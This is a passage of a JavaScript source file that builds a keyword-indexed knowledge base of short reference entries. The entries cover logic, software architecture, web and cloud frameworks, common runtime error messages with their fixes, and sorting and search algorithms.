    'Modal logic: Extends classical logic with modalities. □p = "necessarily p" (true in all possible worlds). ◇p = "possibly p" (true in some possible world). Axioms: K (□(p→q) → (□p→□q)), T (□p→p), 4 (□p→□□p), 5 (◇p→□◇p). Temporal logic: □ becomes "always" (G), ◇ becomes "eventually" (F). LTL (Linear Temporal Logic): F, G, X (next), U (until). CTL: adds path quantifiers A (all paths), E (some path). Applications: program verification, AI reasoning, philosophy, legal reasoning, database query languages.', 1.0)

  // ── Critical Thinking & Problem Solving ──
  add('logic', ['critical thinking', 'argument', 'premise', 'conclusion', 'valid', 'sound'],
    'Critical thinking framework: 1) Identify the claim/conclusion. 2) Identify premises/evidence. 3) Check if premises support conclusion (validity). 4) Check if premises are actually true (soundness). 5) Look for hidden assumptions. 6) Consider alternative explanations. 7) Evaluate evidence quality and source reliability. 8) Check for logical fallacies. 9) Consider counterarguments. Argument types: deductive (guaranteed), inductive (probable), abductive (best explanation). Strong arguments: valid/strong logic + true/well-supported premises + relevant evidence + no fallacies.', 1.3)

  add('logic', ['problem solving', 'heuristic', 'strategy', 'systematic', 'decomposition'],
    'Problem-solving strategies: 1) Understand the problem — what is given? What is unknown? What are constraints? 2) Devise a plan — look for patterns, work backwards, draw diagrams, simplify, divide into sub-problems. 3) Execute the plan — work carefully, check each step. 4) Look back — verify answer, consider alternatives, generalize. Heuristics: means-ends analysis (reduce difference between current and goal state), analogical transfer (solve similar known problem), constraint satisfaction, generate-and-test, hill climbing. Polya\'s "How to Solve It" framework.', 1.3)

  add('logic', ['dimensional analysis', 'unit conversion', 'unit analysis', 'scientific notation'],
    'Dimensional analysis: Use units to check equations and convert between systems. All terms in an equation must have the same dimensions. Example: F = ma → [kg·m/s²] = [kg]·[m/s²] ✓. Unit conversion: multiply by conversion factors (fractions equal to 1). Example: 60 mph × (1609 m/mile) × (1 hr/3600 s) = 26.8 m/s. SI prefixes: pico (10⁻¹²), nano (10⁻⁹), micro (10⁻⁶), milli (10⁻³), kilo (10³), mega (10⁶), giga (10⁹), tera (10¹²). Scientific notation: 3.0×10⁸ m/s. Significant figures: precision of measurement.', 1.2)

  add('logic', ['scientific method', 'hypothesis', 'experiment', 'theory', 'scientific'],
    'Scientific method: 1) Observation — notice a phenomenon. 2) Question — what, why, how? 3) Hypothesis — testable prediction. 4) Experiment — controlled test (independent/dependent/control variables). 5) Analysis — collect data, statistical tests. 6) Conclusion — does data support hypothesis? 7) Peer review and replication. Key principles: falsifiability (must be possible to disprove), reproducibility, control groups, double-blind studies, statistical significance (p < 0.05). Theory vs hypothesis: theory is well-tested, broad explanatory framework. Law: describes what happens. Theory: explains why.', 1.3)

  // ── Mathematical Logic for CS ──
  add('logic', ['lambda calculus', 'church encoding', 'functional programming', 'church'],
    'Lambda calculus: Formal system for computation using function abstraction and application. Syntax: variable x, abstraction λx.M, application (M N). Church encoding: booleans — TRUE = λx.λy.x, FALSE = λx.λy.y. Numbers: 0 = λf.λx.x, 1 = λf.λx.f(x), 2 = λf.λx.f(f(x)). SUCC = λn.λf.λx.f(n f x). Y combinator: Y = λf.(λx.f(x x))(λx.f(x x)) — enables recursion. Church-Turing thesis: lambda calculus ≡ Turing machine in computational power. Foundation of functional programming (Haskell, Lisp, ML).', 1.1)

  add('logic', ['type theory', 'curry howard', 'types as propositions', 'dependent type'],
    'Type theory and Curry-Howard correspondence: Types = Propositions, Programs = Proofs. If you can write a program of type A→B, you\'ve proved that A implies B. Product types (A×B) = AND (conjunction). Sum types (A+B) = OR (disjunction). Function types (A→B) = implication. Void type = falsehood. Unit type = truth. Dependent types: types that depend on values — enables expressing precise specifications in the type system. Used in: Coq, Agda, Idris, Lean. Martin-Löf type theory: constructive foundations of mathematics. Homotopy type theory (HoTT): connects type theory with topology.', 1.0)

  add('logic', ['automata', 'finite state', 'regular expression', 'context free', 'pushdown'],
    'Automata theory (Chomsky hierarchy): Type 3 — Regular languages: finite automata (DFA/NFA), regular expressions. Pumping lemma proves non-regularity. Type 2 — Context-free: pushdown automata (PDA), context-free grammars (programming languages, XML). CYK algorithm parses in O(n³). Type 1 — Context-sensitive: linear-bounded automata. Type 0 — Recursively enumerable: Turing machines. Each level strictly more powerful than the one below. Applications: compilers (lexing = regex, parsing = CFG), protocol verification, text processing, bioinformatics.', 1.1)

  // ── Architecture ──
  add('architecture', ['architecture', 'microservice', 'monolith', 'system design'],
    'Architecture patterns: Monolith (simple, one deployable), Microservices (independent services, complex), Event-Driven (async messaging), Serverless (function-as-a-service), CQRS (separate read/write), Clean Architecture (dependency inversion). Choose based on team size, scale needs, and complexity budget.', 1.1)

  add('architecture', ['solid', 'principle', 'clean code'],
    'SOLID principles: S — Single Responsibility, O — Open/Closed (open for extension, closed for modification), L — Liskov Substitution, I — Interface Segregation, D — Dependency Inversion. These guide writing maintainable, extensible, testable code.', 1.2)

  // ── Frameworks & Libraries ──
  add('frameworks', ['react', 'jsx', 'hooks', 'component', 'useState'],
    'React is a UI library for building component-based interfaces. Key concepts: JSX, components, hooks (useState, useEffect, useContext, useReducer, useMemo, useCallback, useRef), virtual DOM, one-way data flow. Best practices: keep components small, lift state up, use custom hooks, memoize expensive computations.', 1.2)

  add('frameworks', ['express', 'middleware', 'nodejs server', 'http server'],
    'Express.js is the most popular Node.js web framework. Key concepts: middleware pipeline, routing (app.get/post/put/delete), request/response objects, error handling middleware, static file serving. Best practices: use helmet for security, cors for cross-origin, express-validator for input validation, structured error handling.', 1.1)

  add('frameworks', ['django', 'flask', 'fastapi', 'python web'],
    'Python web frameworks: Django (full-featured MVC, ORM, admin panel), Flask (lightweight, flexible), FastAPI (async, auto-docs, type hints, Pydantic validation). Best practices: use virtual environments, follow framework conventions, separate settings by environment, use migrations for DB changes.', 1.1)

  add('frameworks', ['spring', 'spring boot', 'java web'],
    'Spring Boot is Java\'s enterprise framework. Key concepts: dependency injection, auto-configuration, annotations (@RestController, @Service, @Repository), Spring Data JPA, Spring Security. Best practices: use constructor injection, profiles for environments, actuator for monitoring.', 1.0)

  add('frameworks', ['vue', 'angular', 'svelte', 'frontend framework'],
    'Frontend frameworks: Vue (reactive, composition API, single-file components), Angular (full framework, TypeScript, RxJS, dependency injection), Svelte (compile-time, no virtual DOM, minimal bundle). Choose Vue for simplicity, Angular for enterprise, Svelte for performance.', 1.0)

  add('frameworks', ['nextjs', 'nuxt', 'remix', 'ssr', 'server side rendering'],
    'Meta-frameworks: Next.js (React SSR/SSG, API routes, app router), Nuxt (Vue SSR/SSG), Remix (React, nested routes, progressive enhancement). Key concepts: server components, streaming SSR, static generation, incremental regeneration, edge functions.', 1.1)

  // ── Error Patterns & Debugging ──
  add('debugging', ['error', 'debug', 'stack trace', 'exception', 'crash'],
    'Debugging strategy: 1) Read the error message and stack trace carefully, 2) Reproduce the bug consistently, 3) Isolate the cause (binary search through code), 4) Check recent changes (git diff), 5) Use debugger breakpoints, 6) Add targeted logging, 7) Verify the fix doesn\'t break other tests. Common: null reference, off-by-one, race condition, type mismatch.', 1.3)

  add('debugging', ['null', 'undefined', 'typeerror', 'cannot read properties'],
    'Null/undefined errors: "Cannot read properties of undefined" — the object you\'re accessing doesn\'t exist. Fixes: 1) Optional chaining (?.), 2) Nullish coalescing (??), 3) Guard clauses (if (!obj) return), 4) Default values, 5) TypeScript strict null checks. Prevention: always validate inputs, use non-nullable types.', 1.3)

  add('debugging', ['memory leak', 'performance issue', 'slow', 'optimization'],
    'Performance debugging: Memory leaks — unclosed event listeners, timers, closures holding references. CPU bottlenecks — profile with Chrome DevTools / flamegraphs. Fixes: remove event listeners on cleanup, use WeakMap/WeakRef, debounce/throttle handlers, lazy loading, caching, pagination, indexing queries.', 1.2)

  add('debugging', ['race condition', 'deadlock', 'concurrent', 'thread safety'],
    'Concurrency bugs: Race conditions — two operations compete for shared state. Deadlocks — two processes wait on each other. Fixes: locks/mutexes, atomic operations, immutable data, message passing, actor model. In JS: avoid shared mutable state between async operations, use proper await ordering.', 1.2)

  // ── Code Quality & Best Practices ──
  add('quality', ['refactor', 'refactoring', 'code smell', 'technical debt'],
    'Common code smells: Long methods (>20 lines), God classes (>300 lines), deep nesting (>3 levels), magic numbers, duplicate code, feature envy, shotgun surgery. Refactoring techniques: Extract Method, Extract Class, Rename, Move, Inline, Replace Conditional with Polymorphism, Introduce Parameter Object.', 1.2)

  add('quality', ['naming', 'convention', 'variable name', 'function name'],
    'Naming conventions: Use descriptive names (getUserById not gUBI), camelCase for JS/TS vars/functions, PascalCase for classes/components, UPPER_SNAKE for constants, kebab-case for files/URLs. Booleans: isActive, hasPermission, canEdit. Functions: verb + noun (fetchUser, calculateTotal, validateEmail).', 1.1)

  add('quality', ['error handling', 'try catch', 'exception handling'],
    'Error handling best practices: 1) Never swallow errors silently (empty catch), 2) Use custom error classes, 3) Handle errors at the right abstraction level, 4) Log errors with context (user, request, timestamp), 5) Return meaningful error messages to users, 6) Use Result/Either types for expected failures, throw for unexpected ones.', 1.3)

  add('quality', ['logging', 'log', 'monitoring', 'observability'],
    'Logging best practices: Use structured logging (JSON), log levels (error, warn, info, debug), correlation IDs for request tracing. Include: timestamp, service name, request ID, user ID, action, result. Tools: Winston/Pino (Node), structlog (Python), Serilog (.NET). Never log sensitive data (passwords, tokens, PII).', 1.1)

  add('quality', ['type safety', 'typing', 'generics', 'type guard'],
    'Type safety patterns: Use generics for reusable type-safe code, discriminated unions for state machines, branded types for domain values (UserId vs string), type guards (is/as) for narrowing, const assertions for literal types, zod/io-ts for runtime validation matching compile-time types.', 1.2)

  // ── Common Coding Tasks ──
  add('tasks', ['authentication', 'login', 'jwt', 'oauth', 'session'],
    'Authentication patterns: JWT (stateless, token in header, short-lived access + refresh tokens), Session (stateful, cookie-based, server-side storage), OAuth 2.0 (third-party login). Best practices: hash passwords with bcrypt/argon2, use HTTPS, httpOnly cookies for tokens, CSRF protection, rate limit login attempts.', 1.3)

  add('tasks', ['validation', 'input validation', 'sanitize', 'form validation'],
    'Input validation: Validate on both client (UX) and server (security). Patterns: schema validation (Zod, Joi, Yup), type coercion, whitelist over blacklist, sanitize HTML output. Check: required fields, string length limits, email/URL format, numeric ranges, enum values. Always validate before processing.', 1.2)

  add('tasks', ['pagination', 'cursor', 'offset', 'infinite scroll'],
    'Pagination strategies: Offset-based (LIMIT/OFFSET — simple but slow on large datasets), Cursor-based (keyset — fast, consistent, ideal for infinite scroll), Page-number (user-friendly for search results). Return: items, totalCount, hasNextPage, nextCursor. Use cursor-based for real-time feeds, offset for admin tables.', 1.1)

  add('tasks', ['caching', 'cache', 'redis', 'memoize'],
    'Caching strategies: In-memory (fastest, single process), Distributed (Redis/Memcached — shared across services), CDN (static assets), Browser cache (HTTP headers). Patterns: Cache-aside (lazy load), Write-through, Write-behind, TTL-based expiry. Invalidation: time-based, event-based, versioned keys. Cache the most frequently read, rarely changed data.', 1.2)

  add('tasks', ['file upload', 'stream', 'buffer', 'blob'],
    'File handling patterns: Streaming (process chunks, low memory), Buffering (load entire file, simple but memory-heavy), Multipart upload (form-data for web). Validation: check file type (magic bytes not just extension), size limits, virus scanning. Storage: local disk, S3/GCS (scalable), CDN for delivery.', 1.0)

  add('tasks', ['websocket', 'realtime', 'sse', 'socket', 'event stream'],
    'Real-time communication: WebSockets (bidirectional, persistent connection), Server-Sent Events (one-way server→client, auto-reconnect), Long polling (fallback). Use WebSockets for chat/gaming, SSE for notifications/feeds, polling for simple status checks. Libraries: Socket.io (Node), ws (lightweight).', 1.1)

  add('tasks', ['regex', 'regular expression', 'pattern matching', 'string parsing'],
    'Regex essentials: . (any char), \\d (digit), \\w (word char), \\s (whitespace), * (0+), + (1+), ? (0-1), [] (char class), () (group), | (or), ^ (start), $ (end). Common patterns: email (/\\S+@\\S+\\.\\S+/), URL, phone number, date. Use named groups (?<name>...) for readability. Test at regex101.com.', 1.1)

  // ── DevOps & CI/CD ──
  add('devops', ['ci', 'cd', 'pipeline', 'github actions', 'deployment'],
    'CI/CD pipeline stages: 1) Lint & type-check, 2) Unit tests, 3) Integration tests, 4) Build, 5) Security scan (SAST/DAST), 6) Deploy to staging, 7) E2E tests, 8) Deploy to production, 9) Smoke tests. Tools: GitHub Actions, GitLab CI, Jenkins, CircleCI. Best practices: fail fast, cache dependencies, parallel jobs, rollback strategy.', 1.2)

  add('devops', ['environment variable', 'env', 'config', 'secret management'],
    'Configuration management: Use environment variables for deployment-specific config (DB URLs, API keys, feature flags). Never commit secrets to git. Tools: dotenv (development), Vault/AWS Secrets Manager (production), 1Password/Bitwarden (team). 12-Factor App: store config in the environment, not code.', 1.2)

  add('devops', ['monitoring', 'alerting', 'metrics', 'apm'],
    'Monitoring stack: Metrics (Prometheus/Datadog — CPU, memory, request rate), Logs (ELK/Loki — structured logging), Traces (Jaeger/Zipkin — request flow), APM (New Relic/Datadog — end-to-end). Alert on: error rate spikes, latency p99, resource exhaustion, business metrics. Use dashboards for real-time visibility.', 1.0)

  // ── Code Fixing Patterns ──
  add('fixing', ['fix', 'bug fix', 'patch', 'hotfix', 'repair code'],
    'Code fixing strategy: 1) Reproduce the bug with a failing test, 2) Read the error and trace the root cause, 3) Make the minimal fix — change the least code possible, 4) Run the failing test (should pass now), 5) Run full test suite (no regressions), 6) Document what you fixed and why. The best fix addresses the root cause, not just the symptom.', 1.4)

  add('fixing', ['import error', 'module not found', 'cannot find module'],
    'Module resolution errors: "Cannot find module" — check: 1) Package is installed (npm install), 2) Correct import path (relative vs absolute), 3) File extension matches (.js, .ts, .mjs), 4) tsconfig paths/aliases configured, 5) Package.json exports field correct, 6) Node version supports the syntax. For TypeScript: check moduleResolution in tsconfig.', 1.2)

  add('fixing', ['type error', 'type mismatch', 'argument type', 'assignable'],
    'TypeScript type errors: "Type X is not assignable to type Y" — fixes: 1) Narrow the type with type guards, 2) Add missing properties, 3) Use optional chaining for nullable types, 4) Cast with \'as\' only as last resort, 5) Update the type definition if it\'s wrong. "Property does not exist" — add the property to the interface or use optional access.', 1.2)

  add('fixing', ['async error', 'unhandled promise', 'await missing'],
    'Async/Promise errors: "Unhandled promise rejection" — add .catch() or try/catch around await. Missing await — function returns Promise<T> instead of T. Fix: add await, ensure caller is async. "Cannot use await outside async function" — wrap in async IIFE or make the enclosing function async.', 1.2)

  // ══════════════════════════════════════════════════════════════════════════
  // EXPANDED KNOWLEDGE BASE — Phase 3: 500+ entries
  // ══════════════════════════════════════════════════════════════════════════

  // ── React Ecosystem ──
  add('frameworks', ['react hooks', 'usestate', 'useeffect', 'usecallback', 'usememo', 'useref'],
    'React Hooks deep dive: useState (state management), useEffect (side effects, cleanup), useCallback (memoize callbacks for referential equality), useMemo (memoize computed values), useRef (persist values across renders without re-render). Rules: only call at top level, only in React functions. Custom hooks extract reusable stateful logic.', 1.3)

  add('frameworks', ['react context', 'usecontext', 'provider', 'consumer', 'context api'],
    'React Context: Share data across component tree without prop drilling. Create with createContext(), provide with <Provider value={...}>, consume with useContext(). Best practices: split contexts by domain (AuthContext, ThemeContext), memoize provider value to prevent unnecessary re-renders. Avoid for high-frequency state — use state management libraries instead.', 1.2)

  add('frameworks', ['react router', 'routing', 'navigation', 'route', 'link'],
    'React Router v6: createBrowserRouter for data APIs, <RouterProvider>, loader/action for data loading. Key components: <Route>, <Link>, <Outlet> for nested routes. Hooks: useNavigate(), useParams(), useSearchParams(), useLoaderData(). Patterns: protected routes (wrapper component), lazy loading with React.lazy(), error boundaries with errorElement.', 1.2)

  add('frameworks', ['redux', 'zustand', 'jotai', 'state management', 'store'],
    'State management: Redux Toolkit (predictable, devtools, middleware — for large apps), Zustand (simple, no boilerplate — for medium apps), Jotai (atomic, bottom-up — for granular state), Recoil (atoms + selectors — Facebook). Choose RTK for complex state logic, Zustand for simplicity, Jotai for fine-grained reactivity.', 1.2)

  add('frameworks', ['react query', 'tanstack query', 'server state', 'data fetching'],
    'TanStack Query (React Query): Server state management. Key: useQuery (fetch + cache), useMutation (create/update/delete), query invalidation, optimistic updates, infinite queries, prefetching. Replaces manual useEffect+useState for API calls. Config: staleTime, cacheTime, refetchOnWindowFocus. Pairs with axios/fetch.', 1.2)

  add('frameworks', ['react testing', 'testing library', 'rtl', 'render', 'screen'],
    'React Testing Library: Test behavior, not implementation. render() component, find elements with screen.getByRole/getByText/getByTestId. User events with userEvent.click/type. Assertions: expect(element).toBeInTheDocument(). Async: waitFor(), findBy*. Mock: jest.mock() for modules, MSW for API calls. Test what users see and do.', 1.2)

  add('frameworks', ['react performance', 'memo', 'lazy', 'suspense', 'profiler'],
    'React Performance: React.memo() prevents re-renders when props unchanged. useMemo/useCallback memoize values/callbacks. React.lazy() + Suspense for code splitting. Keys in lists must be stable. Avoid: anonymous functions in JSX props, creating objects/arrays in render. Profile with React DevTools Profiler.', 1.2)

  add('frameworks', ['react server components', 'rsc', 'server actions', 'use server'],
    'React Server Components (RSC): Components that render on the server, zero client JS. "use client" marks client boundary. Server Actions ("use server") handle form submissions. Benefits: smaller bundles, direct DB access, streaming. Limitations: no useState/useEffect/browser APIs. Use for data-heavy, non-interactive UI.', 1.1)

  add('frameworks', ['react native', 'mobile', 'expo', 'react native cli'],
    'React Native: Build iOS/Android apps with React. Core components: View, Text, ScrollView, FlatList, TextInput, TouchableOpacity. Navigation: React Navigation (stack, tab, drawer). Styling: StyleSheet.create() (no CSS). Expo: managed workflow (easier setup), bare workflow (more control). Use Hermes engine for performance.', 1.1)

  add('frameworks', ['tailwind', 'tailwindcss', 'utility css', 'postcss'],
    'Tailwind CSS: Utility-first CSS framework. Classes like flex, p-4, text-lg, bg-blue-500, hover:bg-blue-600, md:flex-row. Config: tailwind.config.js for custom colors/fonts/breakpoints. @apply for extracting components. JIT mode for on-demand generation. Pairs with: headlessui, radix-ui, shadcn/ui for accessible components.', 1.1)

  // ── Backend Frameworks ──
  add('frameworks', ['nestjs', 'nest', 'decorator', 'module', 'injectable'],
    'NestJS: TypeScript-first Node.js framework. Architecture: modules → controllers → services. Key decorators: @Module, @Controller, @Injectable, @Get/@Post/@Put/@Delete. Features: dependency injection, guards (auth), interceptors (transform), pipes (validation), middleware. Built on Express/Fastify. Use for enterprise-grade APIs.', 1.2)

  add('frameworks', ['fastify', 'fastify plugin', 'schema validation'],
    'Fastify: High-performance Node.js web framework (2x faster than Express). Key features: schema-based validation (JSON Schema), plugin system, hooks (onRequest, preHandler, onSend), serialization, TypeScript support. Use @fastify/cors, @fastify/jwt, @fastify/swagger. Best for: high-throughput APIs, microservices.', 1.1)

  add('frameworks', ['hono', 'edge', 'web standard', 'cloudflare workers'],
    'Hono: Ultrafast web framework for edge/serverless. Runs on: Cloudflare Workers, Deno, Bun, Node.js. Web Standards-based (Request/Response). Features: middleware, routing, validator, OpenAPI, JSX. TypeScript-first with type-safe routing. Best for: edge computing, serverless APIs, lightweight services.', 1.0)

  add('frameworks', ['graphql', 'apollo', 'schema', 'resolver', 'mutation'],
    'GraphQL: Query language for APIs. Schema defines types/queries/mutations. Resolvers handle data fetching. Apollo Server (Node.js), Apollo Client (React). Key concepts: fragments, subscriptions, pagination (cursor-based), caching (normalized), error handling (errors field). Advantages: no over/under-fetching, strong typing, single endpoint.', 1.2)

  add('frameworks', ['prisma', 'orm', 'schema prisma', 'migration'],
    'Prisma ORM: Type-safe database toolkit for TypeScript. Schema: prisma/schema.prisma (models, relations, enums). Commands: prisma generate (client), prisma migrate dev (migrations), prisma studio (GUI). Features: auto-generated types, relation queries, transactions, raw SQL. Supports: PostgreSQL, MySQL, SQLite, MongoDB.', 1.2)

  add('frameworks', ['drizzle', 'drizzle orm', 'sql like', 'type safe sql'],
    'Drizzle ORM: Lightweight TypeScript ORM. SQL-like syntax: db.select().from(users).where(eq(users.id, 1)). Schema defined in TypeScript (no separate schema file). Features: type-safe queries, migrations, joins, transactions. Supports: PostgreSQL, MySQL, SQLite. Smaller bundle than Prisma. Good for: serverless, edge.', 1.1)

  // ── Cloud Services ──
  add('cloud', ['aws', 'amazon', 'ec2', 's3', 'lambda', 'dynamodb'],
    'AWS core services: EC2 (virtual servers), S3 (object storage), Lambda (serverless functions), DynamoDB (NoSQL), RDS (managed SQL), SQS (message queues), SNS (pub/sub), CloudFront (CDN), IAM (access control), CloudWatch (monitoring). Best practices: use IAM roles (not keys), enable versioning on S3, set billing alerts.', 1.2)

  add('cloud', ['aws lambda', 'serverless function', 'cold start', 'api gateway'],
    'AWS Lambda: Serverless compute — pay per invocation. Triggers: API Gateway, S3, SQS, EventBridge, DynamoDB Streams. Cold starts: use provisioned concurrency or keep-warm. Limits: 15min timeout, 10GB memory, 250MB deploy package. Best practices: minimize package size, use layers for shared code, set appropriate timeouts.', 1.2)

  add('cloud', ['gcp', 'google cloud', 'firebase', 'cloud run', 'bigquery'],
    'Google Cloud: Cloud Run (containers), Cloud Functions (serverless), BigQuery (analytics), Firestore (NoSQL), Cloud SQL (managed SQL), Pub/Sub (messaging), GKE (Kubernetes). Firebase: Auth, Firestore, Hosting, Cloud Messaging. Best practices: use service accounts, enable audit logging, set budget alerts.', 1.1)

  add('cloud', ['azure', 'microsoft cloud', 'app service', 'cosmos db'],
    'Azure services: App Service (web hosting), Functions (serverless), Cosmos DB (global NoSQL), SQL Database (managed SQL), Blob Storage (objects), Service Bus (messaging), AKS (Kubernetes), Active Directory (identity). Best practices: use managed identities, Azure Key Vault for secrets, Application Insights for monitoring.', 1.1)

  add('cloud', ['terraform', 'infrastructure as code', 'iac', 'pulumi', 'cloudformation'],
    'Infrastructure as Code (IaC): Terraform (multi-cloud, HCL, state management), Pulumi (real programming languages), CloudFormation (AWS-specific, YAML/JSON). Terraform workflow: init → plan → apply. Best practices: remote state (S3+DynamoDB), modules for reuse, workspaces for environments, drift detection.', 1.2)

  // ── Error Pattern Database ──
  add('errors', ['cannot read properties', 'undefined is not an object', 'null reference'],
    'TypeError: Cannot read properties of undefined/null — the most common JS error. Root causes: 1) Accessing nested property on missing object, 2) API returned unexpected shape, 3) Array is empty when accessing index, 4) Variable not initialized. Fixes: optional chaining (?.), nullish coalescing (??), guard clauses, TypeScript strict null checks, default values.', 1.4)

  add('errors', ['referenceerror', 'not defined', 'is not defined'],
    'ReferenceError: X is not defined — variable doesn\'t exist in scope. Causes: 1) Typo in variable name, 2) Variable declared in different scope/block, 3) Missing import, 4) Using variable before declaration (temporal dead zone with let/const). Fixes: check spelling, verify imports, ensure variable is declared before use.', 1.3)

  add('errors', ['syntaxerror', 'unexpected token', 'parsing error'],
    'SyntaxError: Unexpected token — code structure is invalid. Common causes: 1) Missing bracket/paren/quote, 2) JSON.parse on non-JSON string, 3) ES module syntax in CommonJS (import/export), 4) Optional chaining in old Node versions. Fixes: use a linter, check brackets match, verify JSON is valid, update Node.js version.', 1.3)

  add('errors', ['rangeerror', 'maximum call stack', 'stack overflow', 'infinite recursion'],
    'RangeError: Maximum call stack size exceeded — infinite recursion. Causes: 1) Missing base case in recursion, 2) Recursive getter/setter, 3) Circular JSON.stringify, 4) Event handler triggers itself. Fixes: add base case, use iteration instead, check for circular references (JSON.stringify with replacer), add depth limit.', 1.3)

  add('errors', ['typeerror', 'is not a function', 'not a function'],
    'TypeError: X is not a function — trying to call something that isn\'t callable. Causes: 1) Wrong variable type (object instead of function), 2) Missing parentheses on import, 3) Property name conflict with method name, 4) Forgot to export/import. Fixes: check the variable\'s actual type, verify imports, use typeof check before calling.', 1.3)

  add('errors', ['cors', 'cross origin', 'access-control-allow-origin', 'blocked by cors'],
    'CORS error: Browser blocks cross-origin requests without proper headers. Server must send: Access-Control-Allow-Origin, Access-Control-Allow-Methods, Access-Control-Allow-Headers. Fixes: 1) Add CORS middleware (cors package in Express), 2) Configure API Gateway CORS, 3) Use proxy in development (Vite/webpack proxy). Preflight: OPTIONS request for non-simple requests.', 1.3)

  add('errors', ['econnrefused', 'connection refused', 'enotfound', 'network error'],
    'ECONNREFUSED: Server is not listening on that port. Causes: 1) Service not running, 2) Wrong port/host, 3) Firewall blocking, 4) Docker network issue. ENOTFOUND: DNS resolution failed — wrong hostname. Fixes: check service is running (curl/netcat), verify port number, check Docker network, ensure DNS resolves.', 1.2)

  add('errors', ['eaddrinuse', 'port in use', 'address already in use'],
    'EADDRINUSE: Port is already occupied. Causes: 1) Another instance running, 2) Previous process didn\'t clean up. Fixes: 1) lsof -i :PORT then kill the process, 2) Use a different port, 3) Set SO_REUSEADDR in server options, 4) Use port 0 for auto-assignment in tests. Prevention: graceful shutdown handlers.', 1.2)

  add('errors', ['out of memory', 'heap', 'javascript heap', 'memory limit'],
    'JavaScript heap out of memory: Node.js exceeded memory limit (default ~1.7GB). Causes: 1) Memory leak (event listeners, closures, caches), 2) Loading huge file into memory, 3) Unbounded array growth. Fixes: --max-old-space-size=4096 flag, stream large files, use WeakMap/WeakRef, profile with --inspect + Chrome DevTools heap snapshot.', 1.2)

  add('errors', ['timeout', 'etimedout', 'request timeout', 'gateway timeout'],
    'Timeout errors: ETIMEDOUT (TCP connection timeout), request timeout (HTTP), 504 Gateway Timeout (proxy). Causes: 1) Slow API/database, 2) Network issues, 3) Server overloaded. Fixes: increase timeout values, add retry logic with exponential backoff, implement circuit breaker pattern, optimize slow queries, add caching.', 1.2)

  add('errors', ['import error', 'module not found', 'err_module_not_found', 'esm cjs'],
    'ERR_MODULE_NOT_FOUND / Cannot find module: Module resolution failure. ESM vs CJS: use "type": "module" in package.json for ESM, .mjs extension, or --experimental-modules flag. Fixes: 1) npm install the package, 2) Check relative path (./ prefix), 3) Add .js extension for ESM, 4) Check tsconfig paths, 5) Verify package.json exports field.', 1.2)

  add('errors', ['permission denied', 'eacces', 'eperm', 'access denied'],
    'Permission errors (EACCES/EPERM): Process lacks permissions. Causes: 1) File owned by root, 2) npm global install without sudo, 3) Docker volume permissions, 4) SELinux/AppArmor. Fixes: chown/chmod the file, use npm config set prefix, run Docker with --user flag, avoid running as root.', 1.1)

  add('errors', ['segfault', 'segmentation fault', 'sigsegv', 'core dump'],
    'Segmentation fault: Process accessed invalid memory. In Node.js: usually from native addons. Causes: 1) Buggy native module, 2) Incompatible Node version, 3) Corrupted node_modules. Fixes: rebuild native modules (npm rebuild), update packages, check Node version compatibility, try node --abort-on-uncaught-exception for debugging.', 1.1)

  add('errors', ['docker error', 'container exit', 'image pull', 'build failed'],
    'Docker errors: Build failures — check Dockerfile syntax, missing files in context, base image availability. Container exits — check logs (docker logs), entrypoint/cmd, health checks. Image pull — check registry auth, image name/tag. OOMKilled — increase memory limit. Networking — use docker network, check port mappings.', 1.1)

  add('errors', ['git conflict', 'merge conflict', 'rebase conflict', 'conflict markers'],
    'Git merge conflicts: <<<<<<< HEAD marks your changes, ======= divides them, >>>>>>> branch marks incoming. Resolution: 1) Open conflicted files, 2) Choose correct code (or combine), 3) Remove conflict markers, 4) git add resolved files, 5) git commit (or git rebase --continue). Tools: VS Code merge editor, git mergetool. Prevention: small frequent merges, communication.', 1.2)

  add('errors', ['typescript error', 'ts2322', 'ts2345', 'ts2339', 'ts7006'],
    'Common TypeScript errors: TS2322 (type not assignable — narrow or update type), TS2345 (argument type mismatch — check function signature), TS2339 (property doesn\'t exist — add to interface or use optional), TS7006 (implicit any — add type annotation), TS2304 (cannot find name — missing import or declaration).', 1.2)

  add('errors', ['python error', 'indentationerror', 'keyerror', 'attributeerror'],
    'Common Python errors: IndentationError (mix of tabs/spaces — use 4 spaces consistently), KeyError (dict key missing — use .get() with default), AttributeError (object lacks attribute — check type, use hasattr()), ImportError (module not found — install with pip, check PYTHONPATH), ValueError (wrong type conversion — validate input first).', 1.2)

  add('errors', ['npm error', 'npm install fail', 'peer dependency', 'version conflict'],
    'npm errors: ERESOLVE (peer dependency conflict — use --legacy-peer-deps or --force), ENOENT (missing package.json — npm init), permission errors (avoid sudo — fix npm prefix), cache issues (npm cache clean --force), lockfile conflicts (delete node_modules + package-lock.json, reinstall).', 1.2)

  // ── Algorithms & Data Structures ──
  add('algorithms', ['binary search', 'bisect', 'search sorted'],
    'Binary Search: Find element in sorted array in O(log n). Algorithm: compare middle element, search left/right half. Variants: lower_bound (first >=), upper_bound (first >), find insertion point. Implementation: two pointers (lo, hi), while lo <= hi, mid = lo + Math.floor((hi - lo) / 2). Watch for: integer overflow in mid calculation, off-by-one errors.', 1.3)

  add('algorithms', ['merge sort', 'divide and conquer', 'stable sort'],
    'Merge Sort: Divide array into halves, sort recursively, merge sorted halves. Time: O(n log n) always. Space: O(n). Stable sort (preserves equal element order). Good for: linked lists, external sorting (large files). Merging: two pointers compare elements, build result array. Bottom-up variant avoids recursion.', 1.2)

  add('algorithms', ['quick sort', 'partition', 'pivot'],
    'Quick Sort: Choose pivot, partition into <pivot and >pivot, recurse. Time: O(n log n) average, O(n²) worst (bad pivot). Space: O(log n) stack. In-place (no extra array). Pivot strategies: random (recommended), median-of-three, last element. Hoare partition is more efficient than Lomuto. Use insertion sort for small subarrays (<10).', 1.2)

  add('algorithms', ['dynamic programming', 'dp', 'memoization', 'tabulation', 'knapsack'],
    'Dynamic Programming: Solve complex problems by breaking into overlapping subproblems. Memoization (top-down): cache recursive results. Tabulation (bottom-up): fill table iteratively. Key: identify state, recurrence relation, base cases. Classic problems: Fibonacci, knapsack, LCS, edit distance, coin change, longest increasing subsequence.', 1.3)

  add('algorithms', ['bfs', 'breadth first search', 'level order', 'shortest path unweighted'],
    'BFS (Breadth-First Search): Explore level by level using a queue. Time: O(V+E). Use for: shortest path in unweighted graph, level-order traversal, connected components. Implementation: queue, visited set, while queue not empty: dequeue, process, enqueue unvisited neighbors. Returns: shortest path, distance from source.', 1.2)

  add('algorithms', ['dfs', 'depth first search', 'backtracking', 'topological sort'],
